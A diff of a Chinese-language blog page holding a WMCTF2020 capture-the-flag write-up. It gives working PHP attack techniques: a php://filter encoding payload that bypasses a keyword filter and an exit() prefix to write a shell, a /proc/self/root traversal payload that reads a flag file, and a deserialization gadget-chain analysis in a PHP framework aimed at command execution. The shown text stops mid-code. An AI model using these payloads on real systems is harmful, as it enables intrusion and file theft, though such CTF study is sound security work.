@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -291,23 +291,23 @@
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="c1">//PHP 7.0.33 Apache/2.4.25
-</span><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/sandbox/&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
-<span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
-<span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
-<span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;Sandbox:&#34;</span><span class="o">.</span><span class="nv">$sandbox</span><span class="p">);</span>
-<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;</span><span class="p">,</span><span class="nv">$content</span><span class="p">))</span>
-         <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$content</span><span class="p">))</span>
-        <span class="k">require_once</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
-    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;&lt;?php exit();&#39;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//PHP 7.0.33 Apache/2.4.25
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/sandbox/&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;Sandbox:&#34;</span><span class="o">.</span><span class="nv">$sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;</span><span class="p">,</span><span class="nv">$content</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">         <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$content</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">require_once</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;&lt;?php exit();&#39;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>payload</p>
 <div class="highlight"><div class="chroma">
@@ -315,8 +315,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="c1">//convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|x&lt;ap?ph@ vela$(P_SO[Tytksli]l;)&gt;?/resource=tyskill.php
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="c1">//convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|x&lt;ap?ph@ vela$(P_SO[Tytksli]l;)&gt;?/resource=tyskill.php
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="wmctf2020make-php-great-again20"><a href="#wmctf2020make-php-great-again20" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:wmctf2020make-php-great-again20" class="headings">[WMCTF2020]Make PHP Great Again&amp;2.0</a></h2>
 <blockquote>
@@ -329,8 +329,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="wmctf2020webcheckinwebweb"><a href="#wmctf2020webcheckinwebweb" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:wmctf2020webcheckinwebweb" class="headings">[WMCTF2020]webcheckin/webweb</a></h2>
 <blockquote>
@@ -352,12 +352,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">-&gt;</span><span class="na">events</span><span class="p">[</span><span class="s1">&#39;disconnect&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
-        <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$func</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">-&gt;</span><span class="na">events</span><span class="p">[</span><span class="s1">&#39;disconnect&#39;</span><span class="p">]))</span>
-        <span class="nv">$func</span><span class="p">(</span><span class="nv">$this</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">-&gt;</span><span class="na">events</span><span class="p">[</span><span class="s1">&#39;disconnect&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$func</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">-&gt;</span><span class="na">events</span><span class="p">[</span><span class="s1">&#39;disconnect&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$func</span><span class="p">(</span><span class="nv">$this</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>可以看到这里使用<code>$this-&gt;server-&gt;events['disconnect']</code>并判断函数是否可调用，很明显，即使$func可以任意污染，它最终还是要在Agent作用域内执行，它的参数固定为了Agent且Agent没有<code>__toString</code>方法也表明了这里没办法实现任意命令执行。</p>
 <p>因此我们只能换方向——<strong>寻找魔术方法</strong>，满足现在情况下的方法有<code>__call、__callStatic</code>（大概。</p>
@@ -373,14 +373,14 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span>
-        <span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">props</span><span class="p">)</span><span class="o">?</span>
-         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">props</span><span class="p">[</span><span class="nv">$func</span><span class="p">]</span><span class="o">:</span>
-         <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$func</span><span class="p">),</span><span class="nv">$args</span>
-    <span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">props</span><span class="p">)</span><span class="o">?</span>
+</span></span><span class="line"><span class="cl">         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">props</span><span class="p">[</span><span class="nv">$func</span><span class="p">]</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">         <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$func</span><span class="p">),</span><span class="nv">$args</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><code>$this-&gt;props</code>和<code>$func</code>都是可控的，因此通过修改变量就可以调用任意函数。接下来的问题就是如何触发<code>__call</code>，众所周知，触发<code>__call</code>需要调用当前类不存在的方法，但是Agent析构函数的<code>$func($this)</code>似乎已经限制了作用域的选择，所以即使通过传入数组绕过<code>is_callable</code>的判断还是无法成功触发别的作用域中的<code>__call</code>，最终还是要在Agent中寻找触发点，也就是符合<code>$class-&gt;$func($args)</code>的格式，然后找到了fetch方法：</p>
 <div class="highlight"><div class="chroma">
@@ -394,14 +394,14 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">fetch</span><span class="p">()</span> <span class="p">{</span>
-    <span class="c1">// Unmask payload
-</span><span class="c1"></span>    <span class="nv">$server</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">;</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">is_bool</span><span class="p">(</span><span class="nv">$buf</span><span class="o">=</span><span class="nv">$server</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">socket</span><span class="p">)))</span>
-        <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span>
-    <span class="o">...</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">fetch</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Unmask payload
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$server</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_bool</span><span class="p">(</span><span class="nv">$buf</span><span class="o">=</span><span class="nv">$server</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">socket</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Mapper不存在read方法，控制server和socket就可以触发<code>__call</code>实现任意命令执行。</p>
 <p>接下来就是调用fetch函数：</p>
@@ -429,21 +429,21 @@
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">function</span> <span class="nf">autoload</span><span class="p">(</span><span class="nv">$class</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nv">$class</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fixslashes</span><span class="p">(</span><span class="nx">ltrim</span><span class="p">(</span><span class="nv">$class</span><span class="p">,</span><span class="s1">&#39;\\&#39;</span><span class="p">));</span>
-    <span class="sd">/** @var callable $func */</span>
-    <span class="nv">$func</span><span class="o">=</span><span class="k">NULL</span><span class="p">;</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$path</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hive</span><span class="p">[</span><span class="s1">&#39;AUTOLOAD&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
-        <span class="nx">isset</span><span class="p">(</span><span class="nv">$path</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$path</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
-        <span class="k">list</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="nv">$func</span><span class="p">)</span><span class="o">=</span><span class="nv">$path</span><span class="p">;</span>
-    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">split</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hive</span><span class="p">[</span><span class="s1">&#39;PLUGINS&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="o">.</span><span class="nv">$path</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$auto</span><span class="p">)</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$func</span> <span class="o">&amp;&amp;</span> <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$func</span><span class="p">(</span><span class="nv">$auto</span><span class="o">.</span><span class="nv">$class</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">)</span> <span class="o">||</span>
-            <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$auto</span><span class="o">.</span><span class="nv">$class</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">)</span> <span class="o">||</span>
-            <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$auto</span><span class="o">.</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$class</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">)</span> <span class="o">||</span>
-            <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$auto</span><span class="o">.</span><span class="nv">$class</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">))</span>
-            <span class="k">return</span> <span class="k">require</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">autoload</span><span class="p">(</span><span class="nv">$class</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$class</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fixslashes</span><span class="p">(</span><span class="nx">ltrim</span><span class="p">(</span><span class="nv">$class</span><span class="p">,</span><span class="s1">&#39;\\&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="sd">/** @var callable $func */</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$func</span><span class="o">=</span><span class="k">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$path</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hive</span><span class="p">[</span><span class="s1">&#39;AUTOLOAD&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">isset</span><span class="p">(</span><span class="nv">$path</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$path</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">list</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="nv">$func</span><span class="p">)</span><span class="o">=</span><span class="nv">$path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">split</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hive</span><span class="p">[</span><span class="s1">&#39;PLUGINS&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="o">.</span><span class="nv">$path</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$auto</span><span class="p">)</span>
